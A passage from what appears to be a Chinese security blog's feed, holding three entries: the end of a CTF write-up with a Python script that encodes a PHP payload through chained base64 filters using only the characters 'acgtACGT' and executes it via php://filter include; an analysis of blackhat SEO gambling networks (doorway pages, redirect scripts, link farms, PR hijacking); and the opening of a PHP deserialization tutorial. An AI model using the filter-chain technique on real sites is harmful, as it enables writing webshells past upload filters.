class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="keyword">return</span> tables</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到最后的payload</span></span><br><span class="line">def create_payload(tables, data):</span><br><span class="line">    encoded = payload_base64_encode(data)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"[+] Payload base64: "</span> + encoded)</span><br><span class="line">    result = encoded</span><br><span class="line">    <span class="keyword">for</span> d in tables[::<span class="number">-1</span>]:</span><br><span class="line">        encoded = result</span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> i in encoded:</span><br><span class="line">            result += d[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    payload = <span class="string">b"<span class="meta">&lt;?php</span> echo \"hacked by lucifaer\"<span class="meta">?&gt;</span>"</span></span><br><span class="line">    limit_chars = <span class="string">'acgtACGT'</span></span><br><span class="line">    filename = limit_chars</span><br><span class="line">    tables = limited_exchanging(limit_chars)</span><br><span class="line">    <span class="keyword">if</span> tables:</span><br><span class="line">        cipher = create_payload(tables, payload)</span><br><span class="line">        with open(filename, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(cipher)</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">"[+] The encoded data is saved to file (%d Bytes) : %s"</span> % (len(cipher), filename))</span><br><span class="line">        command = <span class="string">"php -r 'include(\""</span> + <span class="string">"php://filter/convert.base64-decode/resource="</span> * (</span><br><span class="line">            len(tables) + <span class="number">1</span>) + <span class="string">"%s\");'"</span> % (filename)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Usage : %s"</span> % command)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[+] Executing..."</span>)</span><br><span class="line">        os.system(command=command)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"[-] Failed: %s"</span> % tables)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>这道题提出了一个比较好的思路，值得学习</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在十一的XDCTF中有一道Upload题引出的如何通过固定的几个字符，利用php伪协议中的&lt;code&gt;convert.base64-encode&lt;/code&gt;来写shell。&lt;/p&gt;
    
    </summary>
    
      <category term="一些思路" scheme="https://lucifaer.com/categories/%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/"/>
    
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
      <category term="CTF" scheme="https://lucifaer.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Blackhat SEO</title>
    <link href="https://lucifaer.com/2017/07/20/Blackhat%20SEO/"/>
    <id>https://lucifaer.com/2017/07/20/Blackhat SEO/</id>
    <published>2017-07-20T10:31:09.000Z</published>
    <updated>2018-11-29T09:47:14.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前分析黑产SEO的笔记</p><a id="more"></a><h1 id="0x00-由两个问题引出来话题"><a href="#0x00-由两个问题引出来话题" class="headerlink" title="0x00 由两个问题引出来话题"></a>0x00 由两个问题引出来话题</h1><h2 id="1-“菠菜”问题"><a href="#1-“菠菜”问题" class="headerlink" title="1. “菠菜”问题"></a>1. “菠菜”问题</h2><p>在使用360搜索时，我们发现了非常严重的现象：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004564178632.jpg" alt=""><br><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004565691879.jpg" alt=""></p><p>在搜索“菠菜”（“博彩谐音”），杏彩等敏感词汇时，360搜索所提供的为您推荐中存在非预期结果，访问这些链接所搜索到的网站都是博彩网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004572110455.jpg" alt=""></p><p>同时，换个方式，我们在360搜索中搜索“赌博谐音”，可以发现给出的链接都是赌博网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004581864390.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004582457255.jpg" alt=""></p><h2 id="2-相关搜索问题"><a href="#2-相关搜索问题" class="headerlink" title="2. 相关搜索问题"></a>2. 相关搜索问题</h2><p>在搜索赌博时，我们在网页最下方的相关搜索处发现了非预期结果：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004594842784.jpg" alt=""></p><p>所有的“赌博交流群”的搜索结果皆为博彩网站。</p><p>同样的情况也出现在搜索“菠菜”关键字时：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004600287650.jpg" alt=""></p><p>进入该链接后，同样存在：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004600611527.jpg" alt=""></p><p>还有在搜索“彩”关键字时：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004605043246.jpg" alt=""></p><p>点击进入，发现全为黄色网站：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004605363821.jpg" alt=""></p><h1 id="0x01-同类搜索引擎比较"><a href="#0x01-同类搜索引擎比较" class="headerlink" title="0x01 同类搜索引擎比较"></a>0x01 同类搜索引擎比较</h1><h2 id="1-百度"><a href="#1-百度" class="headerlink" title="1. 百度"></a>1. 百度</h2><p>“菠菜”关键字：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608450724.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608543555.jpg" alt=""></p><p>“赌博”关键字：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004608936128.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004609010229.jpg" alt=""></p><p>并没有发现相关的博彩网站。</p><h2 id="2-Google"><a href="#2-Google" class="headerlink" title="2. Google"></a>2. Google</h2><p>同样并没有发现相关的博彩网站。</p><h1 id="0x02-为什么会出现这样的现象——Blackhat-SEO"><a href="#0x02-为什么会出现这样的现象——Blackhat-SEO" class="headerlink" title="0x02 为什么会出现这样的现象——Blackhat SEO"></a>0x02 为什么会出现这样的现象——Blackhat SEO</h1><h2 id="1-什么是Blackhat-SEO"><a href="#1-什么是Blackhat-SEO" class="headerlink" title="1. 什么是Blackhat SEO"></a>1. 什么是Blackhat SEO</h2><p>SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。我们都知道，如果一个新站想要取得好的排名，往往需要很长的时间和资源。为了简化这个过程，出现了Blackhat SEO。</p><h2 id="2-Blackhat-SEO的几个基础概念"><a href="#2-Blackhat-SEO的几个基础概念" class="headerlink" title="2. Blackhat SEO的几个基础概念"></a>2. Blackhat SEO的几个基础概念</h2><ul><li>三级域名（即顶级域名、一级域名、二级域名）</li><li><p>泛站群</p><ul><li><p>泛二级域名站群</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004620854981.jpg" alt=""></p><p>  以上这些，都是<code>www.bet3657834.com</code>这个博彩网站的泛二级域名站群。</p><p>  建立这样的泛二级域名站群，可以通过下面的方式实现：</p><ul><li>前提：在做域名解析的时候，选择了*</li><li>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果     </li></ul></li><li><p>泛端口站群</p><p>  基本同上，只是从二级域名变成了端口。</p><ul><li>建立的方法：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</li></ul></li><li><p>站中站</p><p>  就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p></li><li><p>链轮</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15004632649092.png" alt=""></p><p>  中间为想要推广的网站，外围是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加中间网站的外链。谷歌貌已经对此不友好，百度还可以尝试。</p></li><li><p>蜘蛛池</p><p>  蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p></li><li><p>寄生虫</p><p>  寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p></li></ul></li></ul><h1 id="0x03-Blackhat-SEO常用的手法"><a href="#0x03-Blackhat-SEO常用的手法" class="headerlink" title="0x03 Blackhat SEO常用的手法"></a>0x03 Blackhat SEO常用的手法</h1><p>下面列出几种常见的，如果想要了解更加详细的信息，请看<a href="https://cognitiveseo.com/blog/12169/44-black-hat-seo-techniques/" target="_blank" rel="noopener">这里</a>了解详情。（搜索引擎判断关键字堆砌的技术已经非常的成熟，下面就不赘述了）</p><h2 id="3-1-Doorway-Pages-or-Gateway-Pages"><a href="#3-1-Doorway-Pages-or-Gateway-Pages" class="headerlink" title="3.1 Doorway Pages or Gateway Pages"></a>3.1 Doorway Pages or Gateway Pages</h2><p>桥页为一种比较常见的黑产SEO方式，通常该页面充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。通常桥页都会配合页面跳转来实现。</p><h3 id="页面跳转的分类"><a href="#页面跳转的分类" class="headerlink" title="页面跳转的分类"></a>页面跳转的分类</h3><ol><li>服务端跳转</li><li><p>客户端跳转</p><p> 客户端跳转分为：http层跳转，应用层跳转</p><p> 应用层跳转又分为：html head跳转，js跳转</p><ul><li><p>http层跳转</p><p>  http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302</p></li><li><p>html head跳转（HTML refresh）</p><p>  在html代码的head中添加特殊标签如：</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>; <span class="attr">url</span>=<span class="string">"http://target_url/"</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><pre><code>    表示：0秒之后跳转到target_url，这个跳转需要浏览器具体解析html后才能进行。* js跳转    在html代码中添加js代码，通过js代码实现跳转。这部分的案例就很多了，举个有代表性的例子：    ![](http://image-lucifaer.test.upcdn.net/2018/11/29/15002818605123.jpg)    ![](http://image-lucifaer.test.upcdn.net/2018/11/29/15002818294901.jpg)    完成了博彩网站的二级跳转。</code></pre><ol start="3"><li><p>各种跳转包含关系</p><ul><li>服务端跳转</li><li>客户端跳转<ul><li>http跳转</li><li>应用层跳转<ul><li>html head跳转</li><li>html js跳转</li></ul></li></ul></li></ul></li><li><p>各种跳转介绍</p><ul><li>服务端跳转<ul><li>介绍：跳转发生在服务器上，用户不会有任何感觉</li><li>优点：跳转行为在server进行，一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑</li><li>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力</li></ul></li><li>http跳转<ul><li>介绍：跳转发生在服务端发生数据给客户端过程中，用户能感觉到，状态码往往为302.</li><li>优点：响应速度快。</li><li>缺点：仅能做跳转，没有其他功能，基于js和html的跳转可以选择延时跳转，但302无法选择延时跳转等。</li></ul></li><li>html head跳转<ul><li>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。</li><li>优点：跳转方式灵活，可以指定延时跳转以及记录用户信息等。</li><li>缺点：可能多次建立tcp连接，浪费客户端时间。</li></ul></li><li>js跳转<ul><li>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。</li><li>优点：同上</li><li>缺点：同上</li></ul></li></ul></li></ol><p>想要获取详细信息，请看<a href="http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html" target="_blank" rel="noopener">这里</a></p><h2 id="3-2-刷站"><a href="#3-2-刷站" class="headerlink" title="3.2 刷站"></a>3.2 刷站</h2><h3 id="3-2-1-刷排名"><a href="#3-2-1-刷排名" class="headerlink" title="3.2.1 刷排名"></a>3.2.1 刷排名</h3><p>刷排名的原理基于用户点击，搜索引擎认为质量高的网站必然是用户最喜欢点击的网站，搜索一个关键字，一个网站点击的次数越多，说明这个网站是更受用户欢迎的。</p><p>刷搜索引擎排名的核心技术就是模仿大量真实IP搜索某个关键词并直接点击目标网站，一般是通过adsl换ip或者是代理池的方式来实现的。</p><p><strong>应对措施：</strong></p><p>这里说一说百度如何判断刷排名的：</p><ol><li>搜索和地域不相关的词。</li><li>IP过多集中在同一区域或者同一IP段。如果是用adsl拨号换IP的话，尽管IP能切换成不同的IP，但始终都是在同一IP段内，并且IP所在地址是不变的。</li><li>不点击排名在前面的网站，而直接点击某一特定排名的网站。由于是刷排名，软件一般会通过定位或者是查找的方式，直接跳转到某一页中，点击某个特定的网站。这就和普通用户的浏览习惯大相径庭了。</li></ol><h3 id="3-2-2-刷下拉框（相关搜索）"><a href="#3-2-2-刷下拉框（相关搜索）" class="headerlink" title="3.2.2 刷下拉框（相关搜索）"></a>3.2.2 刷下拉框（相关搜索）</h3><p>刷相关搜索的方法，就是发明一些与热门关键字相关的关键字，预先自己建立好响应的页面，通过搜索这个心的关键词能排到第一。然后通过软件在搜索引擎中不断的搜索这个关键字，于是这个关键字就出现在相关搜索的位置，吸引用户点击搜索。</p><h3 id="3-2-3-刷网站流量"><a href="#3-2-3-刷网站流量" class="headerlink" title="3.2.3 刷网站流量"></a>3.2.3 刷网站流量</h3><p>通常说网站流量是指网站的访问量，是用来描述一个网站的用户数量以及用户所浏览的页面数量等指标。</p><p>刷流量具有一些<strong>特征：</strong></p><ol><li>流量大起大落</li><li>重复IP严重</li><li>页面浏览时间太短</li><li>流量不均匀</li><li>外链和流量严重不平衡</li></ol><p>搜索引擎可以针对这些特征来进行相关改进。</p><h2 id="3-3-PR劫持"><a href="#3-3-PR劫持" class="headerlink" title="3.3 PR劫持"></a>3.3 PR劫持</h2><p>PR劫持主要利用的301和302定向的功能。从域名A做301或302转向到域名B，而域名A的PR值较高，域名B在PR更新后，也会显示域名A的PR值。最简单的就是先做301或302跳转到域名B，等PR更新过后，立刻取消转向，同时也获得了和A站相同的PR值。</p><p><strong>检查PR劫持：</strong></p><ul><li><a href="http://checkpagerank.net/" target="_blank" rel="noopener">PR值检测网站</a></li><li>看Google的网页快照，Google快照和你看到的网页不是同一个网站，(一般网站标题和logo都会显示出来)，就非常可疑了，网页快照里面的那个网站就是PR劫持的目标网站。</li><li>查看反向链接，再根据反向链接来判断真实的网站是哪个。登陆google，在搜索框中输入：link:it.xxxxx.com，搜索结果中的网站就是向该网站提供反向链接的，任意打开一个，在里面查找it.xxxxx.com的链接，没有发现。再随机找几个，依然没有发现，这就说明该站的PR是劫持的</li></ul><h2 id="3-4-Link-Farm"><a href="#3-4-Link-Farm" class="headerlink" title="3.4 Link Farm"></a>3.4 Link Farm</h2><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005225455116.png" alt=""></p><p>链接工厂，是指由大量网页交叉链接而构成的一个网络系统，通过加入外链来操纵链接配置。加入的外链的网站内容与互联网上的其他网站相异。这些网页可能来自同一个域或多个不同的域，甚至可能来自不同的服务器。一个站点加入这样一个“链接工厂”后，一方面它可得到来自该系统中所有网页的链接，同时作为交换它需要“奉献”自己的链接，借此方法来提升链接得分，从而达到干预链接得分。</p><p>其目的是通过搜索引擎获得大量流量，或者是将链接指向同一个网站，以提高搜索排名。</p><p>对于搜索引擎来说，规模化的链接工厂是极难发现的，通过与配合其他手法组成的“团体”就是现在我们看到的组织化的，系统化的博彩站点。</p><h1 id="0x04-具体案例分析"><a href="#0x04-具体案例分析" class="headerlink" title="0x04 具体案例分析"></a>0x04 具体案例分析</h1><p>首先，我们利用360搜索搜索“赌博谐音”灰词</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005299905749.jpg" alt=""></p><p>前五个链接全都是博彩网站。</p><h2 id="1-案例——前四都是一家"><a href="#1-案例——前四都是一家" class="headerlink" title="1. 案例——前四都是一家"></a>1. 案例——前四都是一家</h2><p>三个网站，除了劫持的样式不同外，基本的执行过程都是一样的。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005302670141.jpg" alt=""></p><p>首先跳转到<code>http://www.wk2m.net/RLQ4kC325199813.html</code>，之后加载js：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005303201181.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005305735315.jpg" alt=""></p><p>我们简化一下js代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.writeln(<span class="string">"&lt;a href=http://www.w8858.top/?rtl=4779  target=_0&gt;&lt;center&gt;&lt;img src=/ads.jpg broder=0&gt;&lt;/center&gt;&lt;/a&gt;"</span>);</span><br></pre></td></tr></table></figure><p>也就是只要我们点击该图片，就会跳转到博彩网站的注册会员处：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005309941449.jpg" alt=""></p><h3 id="为何这四个网站会在搜索排行第一位"><a href="#为何这四个网站会在搜索排行第一位" class="headerlink" title="为何这四个网站会在搜索排行第一位"></a>为何这四个网站会在搜索排行第一位</h3><p>主要使用了以下黑产SEO的方法：</p><ul><li><p>网页劫持</p><p>  劫持复制了微软安全中心的页面样式。</p></li><li><p>垃圾链接</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005335718055.jpg" alt=""></p><p>  其中包含了大量与主题内容不相关的链接，用以提高网站的权重。</p></li><li><p>关键字堆砌</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005337468367.jpg" alt=""></p></li></ul><pre><code>在网页中大量重复关键词，提高关键词的密度，达到提高关键词排名的效果。</code></pre><ul><li><p>隐藏链接</p><p>  同上图，我们还可以看到很多关键字隐藏在链接中，以提升关键字排名效果。</p></li><li><p>桥页</p><p>  其中的桥页就不细说了，给一张图：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005340909312.jpg" alt=""></p></li><li><p>黑链</p><p>  通过js将链接及图片嵌入这个桥页中。</p></li></ul><p>同时，除开这些手法之外，还是使用了泛二级域名站群和链轮的方式，以此增加了自己的pv值。</p><p>首先看一下收录情况：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005327350147.jpg" alt=""></p><p>可以看到360对其的收录量到达了7480，百度对其的反链达到了12w多。</p><p>相对一个这样的小的指数，这样的收录量和反链数已经很多了，相对来说所占的权重也是非常高的。</p><p>之后，我们发现这个站点还使用了泛二级域名站以及链轮的方式，以增加自己的收录：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005362660787.jpg" alt=""></p><p>我们再看一下这个站的出站链接：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005363121624.jpg" alt=""></p><p>所有的链接的特征与该网页特征相符：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005364195561.jpg" alt=""></p><h2 id="2-案例——较弱的第五"><a href="#2-案例——较弱的第五" class="headerlink" title="2. 案例——较弱的第五"></a>2. 案例——较弱的第五</h2><p>最简单的跳转模式，有趣的是写在了404，这样就就避免了搜索引擎的过滤：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005375874332.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005376227906.jpg" alt=""></p><p>看一下这个脚本：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005376969561.jpg" alt=""></p><p>同样是用了百度统计的接口用来统计数据，然后就是跳转到目标页面：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005378002531.jpg" alt=""></p><p>做适配与插入<code>&lt;iframe&gt;</code>标签。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005414201282.jpg" alt=""></p><p>同时利用404的状态码，过掉了网盾。</p><p>多看了一下，<code>www.dxolkf.net</code>也是个博彩网站，所利用的跳转脚本与上面的脚本差不多，只是改了一下url而已。</p><h3 id="为什么一个如此多404状态的页面会有这么高的收录"><a href="#为什么一个如此多404状态的页面会有这么高的收录" class="headerlink" title="为什么一个如此多404状态的页面会有这么高的收录"></a>为什么一个如此多404状态的页面会有这么高的收录</h3><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005382493256.jpg" alt=""></p><p>看到收录的情况非常的一般，看了一下这些链接：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15005383487079.jpg" alt=""></p><p>发现了相同的地方，<code>www.dxolkf.net</code>这个链接所提供的应该是垃圾链接与关键词的的堆砌，用以提高排名，并通过js脚本来实现目标页的跳转。</p><p>同时使用了链轮来加大<code>www.dxolkf.net</code>的PV值。但是相比前4个来说，做的相对简单，所以收录量并不好。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>通过上面的案例，我们可以看到黑产SEO的利用手段，关键还是在于制造蜘蛛池，通过桥页跳转到目标站。在网站的搭建过程中，普遍的使用泛二级域名站与链轮，使其排名得以提高。</p><h2 id="搜索方面的问题"><a href="#搜索方面的问题" class="headerlink" title="搜索方面的问题"></a>搜索方面的问题</h2><ul><li>搜索的爬虫陷入链接工厂中，形成死循环，导致链接工厂中的PV值提升，使其占据主页</li><li>对于链轮和泛二级域名站没有特别好的判断，造成目标站的PV值上升，使其占据主页</li><li>对于关键字堆砌和垃圾链接的解决方案有不完善的地方。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前分析黑产SEO的笔记&lt;/p&gt;
    
    </summary>
    
      <category term="黑产研究" scheme="https://lucifaer.com/categories/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="黑产研究" scheme="https://lucifaer.com/tags/%E9%BB%91%E4%BA%A7%E7%A0%94%E7%A9%B6/"/>
    
      <category term="BlackHat SEO" scheme="https://lucifaer.com/tags/BlackHat-SEO/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="https://lucifaer.com/2017/07/19/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://lucifaer.com/2017/07/19/PHP反序列化漏洞/</id>
    <published>2017-07-19T05:57:07.000Z</published>
    <updated>2018-11-29T09:36:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章为针对PHP反序列化漏洞的介绍与分析。<br><a id="more"></a></p><h1 id="0x00-序列化的作用"><a href="#0x00-序列化的作用" class="headerlink" title="0x00 序列化的作用"></a>0x00 序列化的作用</h1><ul><li>（反）序列化给我们传递对象提供了一种简单的方法。<ul><li><code>serialize()</code>将一个对象转换成一个字符串</li><li><code>unserialize()</code>将字符串还原为一个对象</li></ul></li><li>反序列化的数据本质上来说是没有危害的</li><li>用户可控数据进行反序列化是存在危害的</li></ul><p>可以看到，反序列化的危害，关键还是在于可控或不可控。</p><h1 id="0x01-PHP序列化格式"><a href="#0x01-PHP序列化格式" class="headerlink" title="0x01 PHP序列化格式"></a>0x01 PHP序列化格式</h1><h2 id="1-基础格式"><a href="#1-基础格式" class="headerlink" title="1. 基础格式"></a>1. 基础格式</h2><ul><li>boolean<ul><li>b:<value>;</value></li><li>b:1;  //  True</li><li>b:0;  //  False</li></ul></li><li>integer<ul><li>i:<value>;</value></li><li>i:1;  //  1</li><li>i:-3; //  -3</li></ul></li><li>double<ul><li>d:<value>;</value></li><li>d:1.2345600000000001; //  1.23456（php弱类型所造成的四舍五入现象）</li></ul></li><li>NULL<ul><li>N;    //NULL</li></ul></li><li>string<ul><li>s:<length>:”<value>“;</value></length></li><li>s:8:”INSOMNIA”;   //  “INSOMNIA”</li></ul></li><li>array<ul><li>a:<length>:{key, value pairs};</length></li><li>a:2:{s:4:”key1”;s:6:”value1”;s:6:”value2”;}   //  array(“key1” =&gt; “value1”, “key2” =&gt; “value2”)</li></ul></li></ul><h2 id="2-序列化举例"><a href="#2-序列化举例" class="headerlink" title="2. 序列化举例"></a>2. 序列化举例</h2><blockquote><p>test.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'Inactive'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来生成一下它的序列化字符串：</p><blockquote><p>serialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./test.php"</span>;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">$object-&gt;set_flag(<span class="string">'Active'</span>);</span><br><span class="line">$data = serialize($object);</span><br><span class="line">file_put_contents(<span class="string">'serialize.txt'</span>, $data);</span><br></pre></td></tr></table></figure><p>代码不难懂，我们通过生成的序列化字符串，来细致的分析一下序列化的格式：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999100639649.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"testflag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure><h2 id="3-注意"><a href="#3-注意" class="headerlink" title="3. 注意"></a>3. 注意</h2><p>这里有一个需要注意的地方，<code>testflag</code>明明是长度为8的字符串，为什么在序列化中显示其长度为10？</p><p>翻阅php官方文档我们可以找到答案：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999107284787.jpg" alt=""></p><p>对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999111683485.jpg" alt=""></p><p>所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"%00test%00flag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="4-反序列化示例"><a href="#4-反序列化示例" class="headerlink" title="4. 反序列化示例"></a>4. 反序列化示例</h2><blockquote><p>unserialize.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">$object = unserialize($filename);</span><br><span class="line"></span><br><span class="line">var_dump($object-&gt;get_flag());</span><br><span class="line">var_dump($object);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/14999120371570.jpg" alt=""></p><h1 id="0x02-PHP（反）序列化有关的魔法函数"><a href="#0x02-PHP（反）序列化有关的魔法函数" 